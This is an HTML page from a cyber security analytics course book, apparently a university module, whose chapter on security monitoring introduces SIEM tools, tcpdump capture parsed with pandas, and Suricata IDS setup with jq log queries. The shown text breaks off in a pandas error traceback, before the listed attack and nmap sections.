@@ -1,0 +1,848 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>03 SECURITY OPERATIONS AND MONITORING &#8212; Cyber Security Analytics</title>
+    
+  <link href="_static/css/theme.css" rel="stylesheet">
+  <link href="_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    
+      
+
+    
+    <link rel="stylesheet" type="text/css" href="_static/pygments.css" />
+    <link rel="stylesheet" type="text/css" href="_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" />
+    <link rel="stylesheet" type="text/css" href="_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
+    <link rel="stylesheet" type="text/css" href="_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
+    
+  <link rel="preload" as="script" href="_static/js/index.be7d3bbb2ef33a8344ce.js">
+
+    <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+    <script src="_static/jquery.js"></script>
+    <script src="_static/underscore.js"></script>
+    <script src="_static/doctools.js"></script>
+    <script src="_static/clipboard.min.js"></script>
+    <script src="_static/copybutton.js"></script>
+    <script>let toggleHintShow = 'Click to show';</script>
+    <script>let toggleHintHide = 'Click to hide';</script>
+    <script>let toggleOpenOnPrint = 'true';</script>
+    <script src="_static/togglebutton.js"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="_static/sphinx-book-theme.d59cb220de22ca1c485ebbdc042f0030.js"></script>
+    <script async="async" src="https://unpkg.com/thebe@0.5.1/lib/index.js"></script>
+    <script>
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="04 MACHINE LEARNING AND VISUALISATION" href="book-04-machinelearningandvisualisation.html" />
+    <link rel="prev" title="02 SECURITY OPERATIONS AND INCIDENT MANAGEMENT" href="book-02-operationsandinfrastructure.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="index.html">
+      
+        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
+        
+      
+      
+      <img src="_static/uwecyber.png" class="logo" alt="logo">
+      
+      
+      <h1 class="site-logo" id="site-title">Cyber Security Analytics</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        <ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-00-csa_start.html">
+   CYBER SECURITY ANALYTICS
+  </a>
+ </li>
+</ul>
+<ul class="current nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-01-csa_intro.html">
+   01 INTRODUCTION TO CYBER SECURITY DATA ANALYTICS
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-02-operationsandinfrastructure.html">
+   02 SECURITY OPERATIONS AND INCIDENT MANAGEMENT
+  </a>
+ </li>
+ <li class="toctree-l1 current active">
+  <a class="current reference internal" href="#">
+   03 SECURITY OPERATIONS AND MONITORING
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-04-machinelearningandvisualisation.html">
+   04 MACHINE LEARNING AND VISUALISATION
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-05-cybertoolsthreatvuln.html">
+   05 CYBER SECURITY ANALYTICS TOOLS - THREAT HUNTING
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-06-cybertoolsincidentresp.html">
+   06 CYBER SECURITY ANALYTICS TOOLS - INCIDENT RESPONSE
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-07-malwareanalysis.html">
+   07 MALWARE ANALYSIS
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="book-08-furtherresearch.html">
+   08 FURTHER RESEARCH DIRECTIONS
+  </a>
+ </li>
+</ul>
+
+    </div>
+</nav> <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="topbar container-xl fixed-top">
+    <div class="topbar-contents row">
+        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
+        <div class="col pl-md-4 topbar-main">
+            
+            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+                <i class="fas fa-bars"></i>
+                <i class="fas fa-arrow-left"></i>
+                <i class="fas fa-arrow-up"></i>
+            </button>
+            
+            
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="_sources/book-03-operationsandmonitoring.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+                onclick="printPdf(this)" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+</div>
+
+            <!-- Source interaction buttons -->
+
+            <!-- Full screen (wrap in <a> to have style consistency -->
+
+<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
+        title="Fullscreen mode"><i
+            class="fas fa-expand"></i></button></a>
+
+            <!-- Launch buttons -->
+
+        </div>
+
+        <!-- Table of contents -->
+        <div class="d-none d-md-block col-md-2 bd-toc show noprint">
+            
+            <div class="tocsection onthispage pt-5 pb-3">
+                <i class="fas fa-list"></i> Contents
+            </div>
+            <nav id="bd-toc-nav" aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#">
+   03 SECURITY OPERATIONS AND MONITORING
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#siem-tools">
+     SIEM Tools
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#splunk">
+       Splunk
+      </a>
+     </li>
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#elastic">
+       elastic
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#network-traffic-analysis">
+     Network Traffic Analysis
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#tcpdump">
+       tcpdump
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#intrusion-detection">
+     Intrusion Detection
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#suricata">
+       Suricata
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#data-retrival">
+     Data retrival
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#osquery">
+       osquery
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#cyber-range">
+     Cyber Range
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#detectionlab">
+       DetectionLab
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#conducting-an-attack">
+   Conducting an Attack
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#set-up-kali">
+     Set up Kali
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#using-nmap">
+   Using nmap
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detectionlab-managing-the-virtual-machines">
+   DetectionLab: Managing the Virtual Machines
+  </a>
+ </li>
+</ul>
+
+            </nav>
+        </div>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>03 SECURITY OPERATIONS AND MONITORING</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#">
+   03 SECURITY OPERATIONS AND MONITORING
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#siem-tools">
+     SIEM Tools
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#splunk">
+       Splunk
+      </a>
+     </li>
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#elastic">
+       elastic
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#network-traffic-analysis">
+     Network Traffic Analysis
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#tcpdump">
+       tcpdump
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#intrusion-detection">
+     Intrusion Detection
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#suricata">
+       Suricata
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#data-retrival">
+     Data retrival
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#osquery">
+       osquery
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#cyber-range">
+     Cyber Range
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#detectionlab">
+       DetectionLab
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#conducting-an-attack">
+   Conducting an Attack
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#set-up-kali">
+     Set up Kali
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#using-nmap">
+   Using nmap
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detectionlab-managing-the-virtual-machines">
+   DetectionLab: Managing the Virtual Machines
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            
+              <div>
+                
+  <div class="tex2jax_ignore mathjax_ignore section" id="security-operations-and-monitoring">
+<h1>03 SECURITY OPERATIONS AND MONITORING<a class="headerlink" href="#security-operations-and-monitoring" title="Permalink to this headline">¶</a></h1>
+<p>In this section, we will cover:</p>
+<ul class="simple">
+<li><p>Security Information and Event Management (SIEM).</p></li>
+<li><p>Intrusion Detection Systems (IDS)</p></li>
+<li><p>Network Traffic Analysis</p></li>
+<li><p>Data query (osquery)</p></li>
+<li><p>Cyber Range (DetectionLab)</p></li>
+</ul>
+<div class="section" id="siem-tools">
+<h2>SIEM Tools<a class="headerlink" href="#siem-tools" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="https://www.mcafee.com/enterprise/en-us/security-awareness/operations/what-is-siem.html">What is a SIEM?</a> Security Information and Event Management (SIEM) is software that improves security awareness of an IT environment by combining security information management (SIM) and security event management (SEM). SIEM solutions enhance threat detection, compliance, and security incident management through the gathering and analysis of real-time and historical security event data and sources. SIEM main capabilities provide a broad range of log event collection and management, increasing the ability to analyze log events and other data across dissimilar sources, and operational capabilities including incident management, dashboards, and reporting. SIEM also offers data aggregation across the enterprise network and normalization of that data for further analysis. Additionally, SIEM helps enable security monitoring, user activity monitoring, and compliance.</p>
+<div class="section" id="splunk">
+<h3>Splunk<a class="headerlink" href="#splunk" title="Permalink to this headline">¶</a></h3>
+<p>One of the most widely known tools for developing a SIEM (Security Information and Event Management) system. Splunk has been used for a number of years, and by many organisations round the world. It essentially provides the mechanism to ingest and search data at scale, meaning that it is well-suited for machine data such as machine-generated logging. However the use cases of Splunk actually extend beyond cyber security to various other big data analysis domains. Users can search data using the Splunk Query Language, a similar concept to that of Structured Query Language used for common databases.</p>
+<p><a class="reference external" href="https://github.com/splunk/attack_range">Splunk Attack Range</a>: The Attack Range is a detection development platform, which solves three main challenges in detection engineering:</p>
+<ol class="simple">
+<li><p>The user is able to quickly build a small lab infrastructure as close as possible to a production environment.</p></li>
+<li><p>The Attack Range performs attack simulation using different engines such as Atomic Red Team or Caldera in order to generate real attack data.</p></li>
+<li><p>It integrates seamlessly into any Continuous Integration / Continuous Delivery (CI/CD) pipeline to automate the detection rule testing process.</p></li>
+</ol>
+</div>
+<div class="section" id="elastic">
+<h3>elastic<a class="headerlink" href="#elastic" title="Permalink to this headline">¶</a></h3>
+<p>elastic (formerly known as ELK stack) is a suite of big data analytic tools: ElasticSearch, LogStash and Kibana. These are often used to construct a SIEM environment. The following examples come from the elastic repository, describing the use of Machine Learning for various cyber security tasks.</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.elastic.co/blog/catching-malware-with-elastic-outlier-detection">Catching malware with Elastic outlier detection</a></p></li>
+<li><p><a class="reference external" href="https://www.elastic.co/blog/machine-learning-in-cybersecurity-training-supervised-models-to-detect-dga-activity">Machine learning in cybersecurity: Training supervised models to detect DGA activity</a></p></li>
+<li><p><a class="reference external" href="https://www.elastic.co/blog/machine-learning-in-cybersecurity-detecting-dga-activity-in-network-data">Machine learning in cybersecurity: Detecting DGA activity in network data</a></p></li>
+<li><p><a class="reference external" href="https://www.elastic.co/guide/en/machine-learning/current/dfanalytics-examples.html">More examples</a></p></li>
+</ul>
+</div>
+</div>
+<div class="section" id="network-traffic-analysis">
+<h2>Network Traffic Analysis<a class="headerlink" href="#network-traffic-analysis" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="tcpdump">
+<h3>tcpdump<a class="headerlink" href="#tcpdump" title="Permalink to this headline">¶</a></h3>
+<p>As perhaps the simplest approach for obtaining network packet capture data, <strong>tcpdump</strong> is a Linux command line tool that can achieve this easily. Wireshark is a popular cross-platform tool with GUI. tshark is the command line version of wireshark, and pyshark is a Python wrapper that interacts with tshark.</p>
+<p>Whilst we can use pyshark within a traditional Python script file (*.py), it can cause some issues with the Jupyter Lab environment - so for now we will examine tcpdump outputs.</p>
+<p>If we want to capture tcpdump activity frrom within Jupyter Lab we can do the following:
+<code class="docutils literal notranslate"><span class="pre">output</span> <span class="pre">=</span> <span class="pre">!sudo</span> <span class="pre">tcpdump</span> <span class="pre">-c</span> <span class="pre">100</span> <span class="pre">-nn</span></code></p>
+<p>(The exclamation mark indicates a bash command to execute, that will then be stored in our Python variable named <em>output</em>. The ability to combine bash scripting with Python scripting is just one benefit of the Jupyter environment.)</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">output</span> <span class="o">=</span> <span class="o">!</span>sudo tcpdump -c <span class="m">100</span> -nn
+
+<span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+
+<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">2</span><span class="p">:])</span>
+
+<span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
+
+<span class="n">nn</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+    <span class="n">entry</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">dd</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">dd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">ddd</span> <span class="o">=</span> <span class="n">dd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)</span>
+        <span class="n">src_ip</span> <span class="o">=</span> <span class="n">ddd</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">src_ip</span><span class="p">))</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ddd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
+            <span class="n">dest_ip</span> <span class="o">=</span> <span class="n">ddd</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+            <span class="nb">print</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">dest_ip</span><span class="p">))</span>
+        <span class="n">entry</span> <span class="o">=</span> <span class="p">[</span><span class="n">ddd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ddd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ddd</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">dd</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="n">ddd</span><span class="p">)</span>
+        <span class="n">nn</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span>
+
+<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">nn</span><span class="p">)</span>
+<span class="n">df</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_html"><div>
+<style scoped>
+    .dataframe tbody tr th:only-of-type {
+        vertical-align: middle;
+    }
+
+    .dataframe tbody tr th {
+        vertical-align: top;
+    }
+
+    .dataframe thead th {
+        text-align: right;
+    }
+</style>
+<table border="1" class="dataframe">
+  <thead>
+    <tr style="text-align: right;">
+      <th></th>
+    </tr>
+  </thead>
+  <tbody>
+  </tbody>
+</table>
+</div></div></div>
+</div>
+</div>
+</div>
+<div class="section" id="intrusion-detection">
+<h2>Intrusion Detection<a class="headerlink" href="#intrusion-detection" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="suricata">
+<h3>Suricata<a class="headerlink" href="#suricata" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://suricata.io/">Suricata</a> is an open-source Intrusion Detection System (IDS). According to the homnepage, <em>‘Suricata is the leading independent open source threat detection engine. By combining intrusion detection (IDS), intrusion prevention (IPS), network security monitoring (NSM) and PCAP processing, Suricata can quickly identify, stop, and assess the most sophisticated attacks’</em>. Here we will describe briefly some of the setup and usage of the tool.</p>
+<p>Installation in Ubuntu is via the usual apt-get mechanism:</p>
+<p><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">apt-get</span> <span class="pre">install</span> <span class="pre">suricata</span></code></p>
+<p>Configuration is in <code class="docutils literal notranslate"><span class="pre">/etc/suricata</span></code>, default rules exist in <code class="docutils literal notranslate"><span class="pre">/etc/suricata/rules</span></code> and logging is in <code class="docutils literal notranslate"><span class="pre">/var/log/suricata</span></code>.</p>
+<p>We can edit the configuration using <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">nano</span> <span class="pre">/etc/suricata/suricata.yaml</span></code></p>
+<p>(YAML is “Yet Another Markup Language!”)</p>
+<p>Suricata can be launched as follows (specifying the network adapter that we wish to monitor):</p>
+<p><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">suricata</span> <span class="pre">-c</span> <span class="pre">/etc/suricata/suricata.yaml</span> <span class="pre">-i</span> <span class="pre">ens33</span>&#160; <span class="pre">--init-errors-fatal</span></code></p>
+<p>On start up this will populate the rulesets using the <a class="reference external" href="http://emergingthreats.net">emergingthreats.net</a> site.</p>
+<p>We can stop/restart suricata using the service command in Ubuntu:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">service</span> <span class="pre">suricata</span> <span class="pre">stop/restart</span></code></p></li>
+</ul>
+<p><strong>Accessing the log data:</strong> Logging is captured in the <code class="docutils literal notranslate"><span class="pre">/var/log/suricata/eve.json</span></code> file (event file). Some useful ways to interact with this:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">wc</span> <span class="pre">eve.json</span></code> (will print out the number of lines, number of words and number of bytes).</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">head</span> <span class="pre">eve.json</span> <span class="pre">-n</span> <span class="pre">10</span></code> (will print out the first/top 10 lines, i.e. the oldest)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">tail</span> <span class="pre">eve.json</span> <span class="pre">-n</span> <span class="pre">10</span></code> (will print out the last/bottom 10 lines, i.e. the most recent)</p></li>
+</ul>
+<p>Another useful tool to know about for managing log data is <a class="reference external" href="https://stedolan.github.io/jq/">jq</a>. This is a light-weight tool for parsing and searching JSON documents.</p>
+<p><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">apt-get</span> <span class="pre">install</span> <span class="pre">jq</span></code></p>
+<p>Example usage:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">tail</span> <span class="pre">eve.json</span> <span class="pre">-n</span> <span class="pre">10</span> <span class="pre">|</span> <span class="pre">jq</span> <span class="pre">'.'</span></code> - this will do as above, but then will pipe the result to jq which will format the result on the CLI.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">eve.json</span> <span class="pre">|</span> <span class="pre">jq</span> <span class="pre">'select(.event_type==&quot;flow&quot;)'</span></code> - specify a matching query</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">eve.json</span> <span class="pre">|</span> <span class="pre">jq</span> <span class="pre">'select(.src_ip==&quot;192.168.147.147&quot;</span> <span class="pre">and</span> <span class="pre">.proto==&quot;UDP&quot;)'</span></code>- specify multiple matching queries</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">eve.json</span> <span class="pre">|</span> <span class="pre">jq</span> <span class="pre">'select(.src_port</span> <span class="pre">&gt;</span> <span class="pre">40000)'</span></code> - specify a range query</p></li>
+</ul>
+<p><strong>Accessing the log data using Pandas:</strong></p>
+<p>An alternative method is to use Pandas and the Jupyter Lab environment. Below we show an example of accessing these using the Pandas library. For completeness, we first extract the eve.json from our virtual machine using SCP (secure copy).</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">scp</span> <span class="pre">uwe&#64;192.168.147.146:/var/log/suricata/eve.json</span> <span class="pre">.</span></code>  (copy from the Ubuntu source directory to our current target directory)</p></li>
+</ul>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;./example_data/eve.json&#39;</span>
+<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_json</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">lines</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">df</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output traceback highlight-ipythontb notranslate"><div class="highlight"><pre><span></span><span class="gt">---------------------------------------------------------------------------</span>
+<span class="ne">ValueError</span><span class="g g-Whitespace">                                </span>Traceback (most recent call last)
+<span class="o">&lt;</span><span class="n">ipython</span><span class="o">-</span><span class="nb">input</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">88</span><span class="n">dbe434df98</span><span class="o">&gt;</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+<span class="g g-Whitespace">      </span><span class="mi">1</span> <span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+<span class="g g-Whitespace">      </span><span class="mi">2</span> <span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;./example_data/eve.json&#39;</span>
+<span class="ne">----&gt; </span><span class="mi">3</span> <span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_json</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">lines</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="g g-Whitespace">      </span><span class="mi">4</span> <span class="n">df</span>
+
+<span class="nn">~\.conda\envs\jupyterbook_env\lib\site-packages\pandas\util\_decorators.py</span> in <span class="ni">wrapper</span><span class="nt">(*args, **kwargs)</span>
+<span class="g g-Whitespace">    </span><span class="mi">197</span>                 <span class="k">else</span><span class="p">:</span>
+<span class="g g-Whitespace">    </span><span class="mi">198</span>                     <span class="n">kwargs</span><span class="p">[</span><span class="n">new_arg_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_arg_value</span>
+<span class="ne">--&gt; </span><span class="mi">199</span>             <span class="k">return</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+<span class="g g-Whitespace">    </span><span class="mi">200</span> 
+<span class="g g-Whitespace">    </span><span class="mi">201</span>         <span class="k">return</span> <span class="n">cast</span><span class="p">(</span><span class="n">F</span><span class="p">,</span> <span class="n">wrapper</span><span class="p">)</span>
+
+<span class="nn">~\.conda\envs\jupyterbook_env\lib\site-packages\pandas\util\_decorators.py</span> in <span class="ni">wrapper</span><span class="nt">(*args, **kwargs)</span>
+<span class="g g-Whitespace">    </span><span class="mi">294</span>                 <span class="p">)</span>
